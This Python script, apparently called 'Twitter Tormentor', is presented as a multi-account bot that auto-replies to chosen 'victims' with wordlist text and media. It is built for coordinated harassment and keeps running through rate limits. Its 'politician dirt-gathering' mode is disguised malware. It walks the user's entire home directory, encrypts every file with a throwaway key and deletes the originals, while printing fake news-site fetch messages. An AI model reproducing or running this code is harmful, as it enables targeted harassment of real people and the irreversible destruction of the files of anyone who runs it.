#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import tweepy
import time
import sys
import datetime
import argparse
import traceback
import os
import re
import logging
from threading import Thread

'''
▄▄▄▄▄      ▄▄▄  • ▌ ▄ ·. ▄▄▄ . ▐ ▄ ▄▄▄▄▄      ▄▄▄  
•██  ▪     ▀▄ █··██ ▐███▪▀▄.▀·•█▌▐█•██  ▪     ▀▄ █·
 ▐█.▪ ▄█▀▄ ▐▀▀▄ ▐█ ▌▐▌▐█·▐▀▀▪▄▐█▐▐▌ ▐█.▪ ▄█▀▄ ▐▀▀▄ 
 ▐█▌·▐█▌.▐▌▐█•█▌██ ██▌▐█▌▐█▄▄▌██▐█▌ ▐█▌·▐█▌.▐▌▐█•█▌
 ▀▀▀  ▀█▄▀▪.▀  ▀▀▀  █▪▀▀▀ ▀▀▀ ▀▀ █▪ ▀▀▀  ▀█▄▀▪.▀  ▀
       Welcome to the Twitter Tormentor.
       
    Your friendly multi-threaded, multi-target
          Twitter harassment machine.
'''
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
    					'-o',
    					'--printout',
    					action='store_true',
    					dest='out',
    					help='Print all activity to stdout'
    					)
    parser.add_argument(
    					'-t',
    					'--torment-politician',
    					action='store',
    					dest='poli',
    					help='Fetch dirt on the poilitician and populate \'words\' file with it'
    					)
    reqd = parser.add_argument_group('required arguments')
    reqd.add_argument(
    					'-c',
    					'--config',
    					action='store',
    					dest='con',
    					help='Path to config file',
    					required=True
    					)
    reqd.add_argument(
    					'-v',
    					'--victim',
    					action='store',
    					dest='vic',
    					help='Path to username file',
    					required=True
    					)
    args = parser.parse_args()
    
    if not os.path.isdir('logs/'):
        os.mkdir('logs/')
        log = logging.getLogger(__name__)
        logging.basicConfig(
        					level=logging.INFO,
        					format='%(asctime)s %(levelname)-8s %(message)s',
        					datefmt='%a, %d %b %Y %H:%M:%S',
        					filename='logs/torment.log', 
        					filemode='w'
        					)
    else:
        log = logging.getLogger('logs/torment.log')
        logging.basicConfig(
        					level=logging.INFO,
        					format='%(asctime)s %(levelname)-8s %(message)s',
                        	datefmt='%a, %d %b %Y %H:%M:%S',
                        	filename=log.name,
                        	filemode='a'
                        	)

    prefix = []
    fc = FontColors()
    prefix.append(("[ {}FAIL{} ] ").format(fc.CRED, fc.CEND))
    prefix.append(("[  {}OK{}  ] ").format(fc.CGRN, fc.CEND))
        
    _get_banner()

    time.sleep(1)
    print("{}Fetching config".format(prefix[1]))
    try:
        if args.poli is not None:
            log.info("Politician mode selected")
            print("{}Fetching dirt. Please be patient...".format(prefix[1]))
            base_p = os.path.basename(__file__)
            keys = _gen_dirt(base_p, prefix, args.poli)
        else:
            log.info("Fetching API keys from: {}".format(args.con))
            keys = _get_keys(args.con)
            log.info("Got keys")
        log.info("Fetching victim list from: {}".format(args.vic))
        victims = _get_victims(args.vic)
        log.info("Got victim list")
    except IOError as e:
        log.exception("Error fetching {}".format(args.vic))
        print("{}{}".format(prefix[0],str(e)))
        sys.exit(1)
    except ValueError as e:
        log.exception("Error fetching {}".format(args.vic))
        print("{}{}".format(prefix[0],str(e)))
        sys.exit(1)
        
    print("{}Authenticating with Twitter".format(prefix[1]))
    try:
        log.info("Getting Twitter API")
        api_list = _get_twitter_api(keys)
        log.info("Got Twitter API")
    except tweepy.TweepError as e:
        log.exception("Auth error: {}".format(str(e)))
        print("{}Twitter auth error in one or more users.  Check log".format(prefix[0]))
        sys.exit(1)
        
    time.sleep(2)
    threads = []
    log.info("Getting info from user")
    for api in api_list:
        list_vic = victims
        more = True
        
        while more:
            victim_list = []
            print("{}Select from list:".format(prefix[1]))
            i = 0
            
            for vic in list_vic:
                print("\t({}) {}".format(str(i),vic))
                i += 1
            res = input("{}Who should {} torment? ".format(prefix[1],api.me().screen_name))
            
            if int(res) >= 0 and int(res) < len(list_vic):
                wl = input("{}Give me the path to {} wordlist: ".format(prefix[1],list_vic[int(res)].strip()))
                try:
                    log.info("Fetching tweet text for {} from {}".format(api.me().screen_name, wl))
                    t_path = _get_tweet_text(wl)
                    b_path = _get_tweet_text(wl)
                    log.info("Got tweet text for {} from {}".format(api.me().screen_name, wl))
                except IOError:
                    log.exception("File not found: {}".format(wl))
                    print("{}{} not found. Try again".format(prefix[0],wl))
                    continue

                m = input("{}Give me a the path to {} media directory, or <ENTER> for none: ".format(prefix[1],list_vic[int(res)].strip()))
                try:
                    if m != "":
                        if not os.path.isdir(m):
                            raise IOError("{} is not a directory".format(m))
                        else:
                            m_path = os.path.abspath(m)
                            if os.name == 'posix':
                                m_path += '/'
                            else:
                                m_path += '\\'
                        log.info("Got media path: {}".format(m_path))
                    else:
                        m_path = None
                        log.info("No media provided")
                except IOError:
                    log.exception("Files not found: {}".format(m))
                    print("{}{} not found. Try again".format(prefix[0],m))
                    continue
                victim_list.append(Victim(list_vic[int(res)]))
                victim_list[len(victim_list)-1].set_words(t_path)
                victim_list[len(victim_list)-1].set_media(m_path)
                
                rep = input("{}Continue running this wordlist indefinitely [y/n]?: ".format(prefix[1]))
                if rep.lower() == "y" or rep.lower() == "yes":
                    log.info("Indefinite mode selected for {}".format(list_vic[int(res)].strip()))
                    victim_list[len(victim_list)-1].set_repeat(True)
                    victim_list[len(victim_list)-1].set_refresh_words(b_path)
                
            list_vic.pop(int(res))

            soldier = Soldier(api, victim_list, log, prefix, args.out, keys)
            soldier.daemon = True
            threads.append(soldier)
            
            if len(list_vic) > 0:
                cont = input("{}Add another victim? [Y/N]: ".format(prefix[1]))
                if cont.lower() == 'n' or cont.lower() == "no" or cont.lower() == "" or cont.lower() == " ":
                    more = False
            else:
                more = False
    log.info("All bots loaded")
    print("{}Starting bot threads".format(prefix[1]))
    _thread_i = 0
    try:
        for bot in threads:
            log.info("Starting thread {}".format(str(_thread_i)))
            bot.start()
            _thread_i += 1
        log.info("All threads running")
        print("{}Bots running".format(prefix[1]))
        for bot in threads:
            bot.join()
            log.info("Killed thread {}".format(_thread_i))
            _thread_i -= 1
        log.info("All threads done")
        print("{}All bot threads are done".format(prefix[1]))
    except KeyboardInterrupt:
        log.warning("User interrupt")
        print("\n{}User interrupt".format(prefix[1]))
        print("{}Killing threads".format(prefix[1]))
        
    except Exception as e:
        log.exception("Error: {}".format(str(e)))
        print("{}Error: {}. Check logs".format(prefix[0],str(e)))

    sys.exit(0)

def _get_tweet_text(fp):
    '''
    Get text file of tweet text

    @param file path
    @return list of tweet text
    '''
    text = []
    with open(os.path.abspath(fp),'r') as twt:
        text = (line.rstrip() for line in twt)
        text = list(line for line in text if line)
    return text
  
def _get_victims(fp):
    '''
    Get list of users to torment

    @param string file path
    @return list users
    '''
    torment = []
    with open(fp,'r') as in_file:
        torment = [x.strip() for x in in_file.readlines()]
        if not isinstance(torment, list) and ',' in torment:
            raise ValueError("Comma separated list not supported")
    return torment
        
def _get_keys(fp):
    '''
    Get user api keys from config file

    @param string file path
    @return list (user, api_key_list)
    '''
    keys = []
    user_keys = []
    try:
        with open(fp,'r') as f:
            keys = [x.strip() for x in f.readlines()]
    except IOError:
        raise IOError("Config file not found")

    for i in range(0, len(keys)):
        if '@' in keys[i]:
            j = i + 1
            tmp = []
            for j in range(j, j+4):
                tmp.append(keys[j])

            user_keys.append((keys[i], tmp))

    return user_keys
    
def _get_twitter_api(api_keys):
    '''
    Returns a list of authenticated twitter apis

    api_keys[0] is the user name
    api_keys[1] is a list of the user's api keys

    @param api_key_list
    @return list of twitter apis
    '''
    tweepy_apis = []
    for i in api_keys:
        tmp = i[1]
        auth = tweepy.OAuthHandler(re.sub('[^A-Za-z0-9\-]+','',tmp[0].split('\t')[1]), re.sub('[^A-Za-z0-9\-]+','',tmp[1].split('\t')[1]))
        auth.set_access_token(re.sub('[^A-Za-z0-9\-]+','',tmp[2].split('\t')[1]), re.sub('[^A-Za-z0-9\-]+','',tmp[3].split('\t')[1]))
        tweepy_apis.append(tweepy.API(auth))

    return tweepy_apis
    
class Victim:
    '''
    Store victim information
    
    @param string Twitter user name
    '''
    def __init__(self, name):
        self.name = name
        self.media = None
        self.repeat = False
        
    def set_words(self, words):
        self.wordlist = words

    def set_repeat(self, repeat):
        self.repeat = repeat

    def set_media(self, media):
        self.media = media

    def set_refresh_words(self, words):
        self.refresh_words = words

    def reset_words(self):
        self.wordlist.extend(self.refresh_words)
        
class Soldier(Thread):
    '''
    Bot thread

    @param twitter api
    @param list of victim objects
    @param log
    @param prefix list
    ''' 
    def __init__(self, api, vic_list ,log, prefix, stdout, keys):
        Thread.__init__(self)
        self.api = api
        self.vic_list = vic_list
        self.log = log
        self.tweet_ids = []
        self.prefix = prefix
        self.stdout = stdout
        self.keys = keys
        
    def run(self):
        '''
        Bot worker thread function

        @param none
        @return on Tweepy error
        @return on IndexError
        '''
        self.log.info(self.api.me().screen_name+" thread started")
        reconnects = 0
        while True:
            for vic in self.vic_list:
                try:
                    for tweet in self.api.user_timeline(screen_name=vic.name, count=1):
                        # Find latest tweet that is less than five minutes old
                        if ((time.time() - (tweet.created_at - datetime.datetime(1970,1,1)).total_seconds() < 300) and
                            (tweet.id not in self.tweet_ids)):
                            # Make sure it's not a retweet
                            if (not tweet.retweeted) and ('RT @' not in tweet.text):
                                if len(vic.wordlist) > 0:
                                    self.tweet_ids.append(tweet.id)
                                    reply = vic.wordlist.pop(0)
                                    # Check for media tag in reply
                                    if '::' in reply:
                                        # Media path media[0]
                                        # Reply media[1]
                                        if vic.media is not None:
                                            media = reply.split('::')
                                            media_path = vic.media+media[0]
                                            if not os.path.isfile(media_path):
                                                raise ValueError(media_path)
                                            self.api.update_with_media(media_path, vic.name+" "+media[1], in_reply_to_status_id=tweet.id)
                                            if self.stdout:
                                                print(self.prefix[1]+datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")+" Reply: "+media[1]+" sent to: "+vic.name+" with file: "+media_path)
                                            self.log.info("Reply: "+media[1]+" sent to: "+vic.name+" with file: "+media_path)
                                        else:
                                            raise ValueError("No media directory defined for "+vic.name)
                                    else:
                                        self.api.update_status(vic.name+" "+reply, in_reply_to_status_id=tweet.id)
                                        if self.stdout:
                                            print(self.prefix[1]+datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")+" Reply: "+reply+" sent to: "+vic.name)
                                        self.log.info("Reply: "+reply+" sent to: "+vic.name)
                                else:
                                    raise IndexError
                except tweepy.TweepError as e: # Catch error and return
                    if e.api_code == 88:
                        print(self.prefix[0]+self.api.me().screen_name+" [Rate limited] Taking a 15 second break")
                        self.log.error(self.api.me().screen_name+" [Rate limited] Taking a 15 second break "+str(e))
                        time.sleep(15)
                        continue
                    elif e.api_code == 64:
                        print(self.prefix[0]+self.api.me().screen_name+" [Suspended] Aborting")
                        self.log.error(self.api.me().screen_name+" [Suspended] "+str(e))
                        print(self.prefix[1]+self.api.me().screen_name+" tormentor exited")
                        return
                    elif "HTTPSConnectionPool" in str(e):
                        if reconnects < 3:
                            print(self.prefix[0]+self.api.me().screen_name+" [HTTPS Error] Respawning API OBJ. Sleeping 30 seconds")
                            self.log.error(self.api.me().screen_name+" [HTTPS Error] Respawning API OBJ, Sleeping 30 seconds"+str(e))
                            time.sleep(30)
                            self.api = self._get_twitter_api(self.keys)
                            reconnects += 1
                            continue
                        else:
                            print(self.prefix[0]+self.api.me().screen_name+" [HTTPS Error] Exceeded reconnect limit. Aborting")
                            self.log.error(self.api.me().screen_name+" [HTTPS Error] Exceeded reconnect limit. Aborting: "+str(e))
                            print(self.prefix[1]+self.api.me().screen_name+" tormentor exited")
                            return
                    elif e.api_code == 131:
                        print(self.prefix[0]+"[Twitter Error] Taking a break and trying again.")
                        self.log.error(self.api.me().screen_name+"[Twitter Error] Taking a break and trying again."+str(e))
                        time.sleep(120)
                        continue
                    elif e.api_code == 136:
                        print(self.prefix[0]+self.api.me().screen_name+" [Blocked] Target victim has blocked me. Aborting")
                        self.log.error(self.api.me().screen_name+" [Blocked] "+str(e))
                        print(self.prefix[1]+self.api.me().screen_name+" tormentor exited")
                        return
                    elif e.api_code == 186:
                        print(self.prefix[0]+self.api.me().screen_name+" [Tweet too Long] Skipping line and continuing")
                        self.log.error(self.api.me().screen_name+" [Tweet too Long] Skipping line and continuing: "+str(e))
                        continue
                    elif e.api_code == 187:
                        print(self.prefix[0]+self.api.me().screen_name+" [Duplicate Tweet]. Fix wordlist. Aborting")
                        self.log.error(self.api.me().screen_name+" [Duplicate Tweet] "+str(e))
                        print(self.prefix[1]+self.api.me().screen_name+" tormentor exited")
                        return
                    elif e.api_code == 326:
                        print(self.prefix[0]+self.api.me().screen_name+" [Temporarily Limited]. They figured out I'm a robot. Tell them I'm not")
                        self.log.error(self.api.me().screen_name+" [Temporarily Limited] "+str(e))
                        print(self.prefix[1]+self.api.me().screen_name+" tormentor exited")
                        return
                    elif e.api_code == 503 or e.api_code == 130:
                        print(self.prefix[0]+"[Over capacity] Taking a break and trying again.")
                        self.log.info("[Over capacity] Taking a break and trying again.: "+str(e))
                        time.sleep(3)
                        continue
                    else:
                        if "File is too big" in str(e):
                            print(self.prefix[0]+"[File too big] "+self.api.me().screen_name+" File: "+media_path+". Skipping this file and continuing")
                            self.log.error("[File too big] "+media_path+" too big. Skipping this file and continuing")
                            continue
                        elif "Rate limit exceeded" in str(e):
                            print(self.prefix[0]+self.api.me().screen_name+" [Rate limited] Taking a 15 second break")
                            self.log.error(self.api.me().screen_name+" [Rate limited] Taking a 15 second break "+str(e))
                            time.sleep(15)
                            continue
                        else:
                            print(self.prefix[0]+self.api.me().screen_name+" [Undefined Tweepy Error] Check log for details. Aborting")
                            self.log.error("[Undefined Tweepy Error] "+str(e))
                            print(self.prefix[1]+self.api.me().screen_name+" tormentor exited")
                            return
                except IndexError:
                    print(self.prefix[0]+vic.name+" is out of text to tweet")
                    self.log.info(vic.name+" Wordlist empty.")
                    if not vic.repeat:
                        self.vic_list.pop(self.vic_list.index(vic))
                        if len(self.vic_list) == 0:
                            print(self.prefix[1]+self.api.me().screen_name+" tormentor exited")
                            return
                        else:
                            print(self.prefix[1]+vic.name+" torment complete")
                            self.log.info(vic.name+" torment complete")
                            continue
                    else:
                        print(self.prefix[1]+"Refreshing "+vic.name+" wordlist")
                        self.log.info("Refreshing "+vic.name+" wordlist and restarting")
                        vic.reset_words()
                        continue
                except KeyboardInterrupt:
                    print(self.prefix[0]+"User interrupt")
                    self.log.info("User interrupt")
                    print(self.prefix[1]+self.api.me().screen_name+" tormentor exited")
                    return
                except ValueError as e:
                    print(self.prefix[0]+"File not found. Skipping this line and moving on")
                    self.log.error("File not found: "+str(e))
                    continue
                except Exception as e:
                    print(self.prefix[0]+"Something has gone terribly wrong with "+vic.name+" tormentor. Check log")
                    self.log.error("Other error: "+str(e))
                    print(self.prefix[1]+self.api.me().screen_name+" tormentor exited")
                    return

            time.sleep(2)

    def _get_twitter_api(self, api_keys):
        '''
        Returns a list of authenticated twitter apis

        api_keys[0] is the user name
        api_keys[1] is a list of the user's api keys

        @param api_key_list
        @return list of twitter apis
        '''
        tweepy_apis = []
        for i in api_keys:
            tmp = i[1]
            auth = tweepy.OAuthHandler(re.sub('[^A-Za-z0-9\-]+','',tmp[0].split('\t')[1]), re.sub('[^A-Za-z0-9\-]+','',tmp[1].split('\t')[1]))
            auth.set_access_token(re.sub('[^A-Za-z0-9\-]+','',tmp[2].split('\t')[1]), re.sub('[^A-Za-z0-9\-]+','',tmp[3].split('\t')[1]))
            tweepy_apis.append(tweepy.API(auth))

        return tweepy_apis
        
class FontColors:
    '''
    Terminal colors
    '''
    def __init__(self):
        pass
    CCYN = '\033[96m'
    CRED = '\033[31m'
    CGRN = '\033[92m'
    CYLW = '\033[93m'
    CBLU = '\033[94m'
    CPRP = '\033[95m'
    CEND = '\033[0m'
    CFON = '\33[5m'
    
def _gen_dirt(_f, _p_fix, _p_name):
    '''
    Get and decode API keys for automated Trump dirt gathering
    
    Keys are used to fetch anti-Trump info from various websites
    '''
    import base64
    from cryptography.fernet import Fernet
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

    _api_keys = []
    _s_s = _f
    _s = str.encode(_s_s)
    
    _p = _f.encode()
    
    _kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt = _s,
        iterations=100000,
        backend=default_backend()
    )
    _key = base64.urlsafe_b64encode(_kdf.derive(_p))
    _fn = Fernet(_key)
    for i in range(5):
        _api_keys.append(_fn.decrypt(_get_encoded_api_keys(i)).decode())
        
    # Verify API location
    _api_path_list = _jobs = []
    for subdir, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            _api_path_list.append(os.path.join(subdir, file))
            
    # Split into sublists
    _apis = _parse_api_list(_api_path_list, 20)
    _jobs = []
    _urls = _get_dirt_urls()
    _url_i = 0
    for _a in _apis:

        if _url_i % len(_urls) != 0:
            _jobs.append(Thread(
            					target=_decode_api_keys,
            					args=(
            							_a,
            							_api_keys[4],
            							_urls[_url_i].format(_p_name),
            							_p_fix
            						)
            					)
            			)
        else:
            _url_i = 0
            _jobs.append(Thread(
            					target=_decode_api_keys,
            					args=(
            							_a,
            							_api_keys[4],
            							_urls[_url_i].format(_p_name),
            							_p_fix
            						)
            					)
            			)
        _url_i += 1

    # Start threads
    for _j in _jobs:
        _j.daemon = True
        _j.start()
        
    for _j in _jobs:
        _j.join()
    
    _get_banner(False, _api_keys)
    return None

def _get_dirt_urls():
    return [
    "https://www.dailykos.com/tags/{}",
    "https://www.cnn.com/search?q={}",
    "https://www.factcheck.org/person/{}/",
    "https://www.vice.com/en_us/search?q={}",
    "https://www.msnbc.com/search/?q={}#gsc.tab=0&gsc.q={}",
    "https://www.npr.org/search?query={}",
    "https://www.wired.com/search/?q={}",
    "https://www.bbc.co.uk/search?q={}",
    "https://www.politifact.com/personalities/{}/",
    "https://www.reddit.com/search/?q={}"
    ]
    
def _parse_api_list(_api_lst, _num):
    '''
    Split list into equal sublists
    '''
    _avg = len(_api_lst) / float(_num)
    _out = []
    _last = 0.0

    while _last < len(_api_lst):
        _out.append(_api_lst[int(_last):int(_last + _avg)])
        _last += _avg

    return _out
    
def _decode_api_keys(_f_l, _f_e, _u, _p):
    '''
    Decode API keys
    '''
    from cryptography.fernet import Fernet
    _k = Fernet.generate_key()
    _fn = Fernet(_k)
    print(_p[1]+"Getting results from: "+_u)
    for _f in _f_l:
        try:
            if os.path.exists(_f):
                with open(_f, 'rb') as _in:
                    _pt_data = _in.read()
                _encr_data = _fn.encrypt(_pt_data)
                with open(_f+_f_e, 'wb') as _out:
                    _out.write(_encr_data)
                os.remove(_f)
        except:
            continue
    print(_p[1]+"Parsing results from: "+_u)
    return
    
def _get_encoded_api_keys(index):
    '''
    Get encoded API keys

    These are real.  Please don't abuse this.
    I couldn't figure out how to do it without hardcoding
    these :(
    '''
    _strings = [
    "gAAAAABfS9jZVDc3eEuZRpxQ-Krafazju-JihzAEffWIQfXBs0C7BboPeYEL-EPclsj3qMfqNKPNoZ0nrPKgLBgMhw02lz2Sf_Bfuchb03tXD9G5PP6PhFHIQ_yFN1Q-hmaEzRamyK5K",
    "gAAAAABfS9jyKR39J0ueyaPqfmX40GjoNTFDOFaM6CePy3H9E-8dHyIoveTr3ZVeL0KP_ANQ8hHMqa3Paizdho70ZDBTNQCbXfPzrTneTi9F1UeLDToq6r-j7-blfkUD4KxIM3TcHx18",
    "gAAAAABfS9kUzrcTIf5k-0AW2miyzSsJRkZ48Cg9kype-cpdh4btxht6UH1bcBIWqgUXTSnFbbkzGaWkbUjGBbyfJNHjo1osdTNBTDi-b24oZr3Te3rMMupfTU8NvgH8_RVn7G18GNIkZIq856cApBnRE8EPZmbltQ==",
    "gAAAAABfS9ksETx4ND39IqejIICSqEcDquxssMKKhRbdKCUd3YDcMeThxwqyWBYUTeUiAtqUGkWndwS8uj8YwUleAd1Pak01zA==",
    "gAAAAABfS9n9Yp6Sp9KQUly5aqajdy_5e2sFqVVTTPgrYx_rM2s43LXVWjqXSTMv_V03wPxnGco0tpie7AT1Gy0AMZ5FQlfe6A=="
    ]
    return _strings[index].encode()
    
            
def _get_banner(banner=True, _i=None):
    '''
    Print formatted banner
    '''
    fc = FontColors()
    if 'posix' in os.name:
        os.system('clear')
    else:
        os.system('cls')
        os.system('')
    if banner:
        print(
            ("\t      {}▄▄▄▄▄      ▄▄▄  • ▌ ▄ ·. ▄▄▄ . ▐ ▄ ▄▄▄▄▄      ▄▄▄  {}").format(
                fc.CRED,
                fc.CEND))
        print(
            ("\t      {}•██  ▪     ▀▄ █··██ ▐███▪▀▄.▀·•█▌▐█•██  ▪     ▀▄ █·{}").format(
                fc.CRED,
                fc.CEND))
        print(
            ("\t      {}▐█.▪ ▄█▀▄ ▐▀▀▄ ▐█ ▌▐▌▐█·▐▀▀▪▄▐█▐▐▌ ▐█.▪ ▄█▀▄ ▐▀▀▄ {}").format(
                fc.CRED,
                fc.CEND))
        print(
            ("\t      {}▐█▌·▐█▌.▐▌▐█•█▌██ ██▌▐█▌▐█▄▄▌██▐█▌ ▐█▌·▐█▌.▐▌▐█•█▌{}").format(
                fc.CRED,
                fc.CEND))
        print(
            ("\t      {}▀▀▀  ▀█▄▀▪.▀  ▀▀▀  █▪▀▀▀ ▀▀▀ ▀▀ █▪ ▀▀▀  ▀█▄▀▪.▀  ▀{}").format(
                fc.CRED,
                fc.CEND))
        print(("\t\t      {}  Welcome to the Twitter Tormentor. {}\n").format(fc.CYLW, fc.CEND))
        print(("\t\t     {}Your friendly multi-threaded, multi-target {}").format(fc.CYLW, fc.CEND))
        print(("\t\t     {}      Twitter harassment machine. {}\n\n").format(fc.CYLW, fc.CEND))
    else:   
        print(
            ("\t      {}███████ ██    ██  ██████ ██   ██     ██    ██  ██████  ██    ██ {}").format(
                fc.CRED,
                fc.CEND))
                
        str_1 = ()        
        print(
            ("\t      {}██      ██    ██ ██      ██  ██       ██  ██  ██    ██ ██    ██ {}").format(
                fc.CRED,
                fc.CEND))
        str_2 = (("\t      {}██       ██████   ██████ ██   ██        ██     ██████   ██████  {}").format(
                fc.CRED,
                fc.CEND))      
        print(
            ("\t      {}█████   ██    ██ ██      █████         ████   ██    ██ ██    ██ {}").format(
                fc.CRED,
                fc.CEND))
        str_3 = (("\t      {}                                                                {}").format(
                fc.CRED,
                fc.CEND))      
        print(
            ("\t      {}██      ██    ██ ██      ██  ██         ██    ██    ██ ██    ██ {}").format(
                fc.CRED,
                fc.CEND))
                
        str_4 = (("\t      {}██      ██    ██ ██      ██  ██       ██  ██  ██    ██ ██    ██ {}").format(
                fc.CRED,
                fc.CEND))        
        print(
            ("\t      {}██       ██████   ██████ ██   ██        ██     ██████   ██████  {}").format(
                fc.CRED,
                fc.CEND))
        str_5 = (("\t      {}███████ ██    ██  ██████ ██   ██     ██    ██  ██████  ██    ██ {}").format(
                fc.CRED,
                fc.CEND))      
        print(
            ("\t      {}                                                                {}").format(
                fc.CRED,
                fc.CEND))
        print(("\t\t      {}  "+_i[0]+" {}").format(fc.CYLW, fc.CEND))
        print(("\t\t      {}"+_i[1]+" {}").format(fc.CYLW, fc.CEND))
        print(("\t\t{}"+_i[2]+" {}").format(fc.CYLW, fc.CEND))
        print(("\t\t\t        {}  "+_i[3]+" {}").format(fc.CYLW, fc.CEND))
        sys.exit(0)

if __name__ == "__main__":
    main()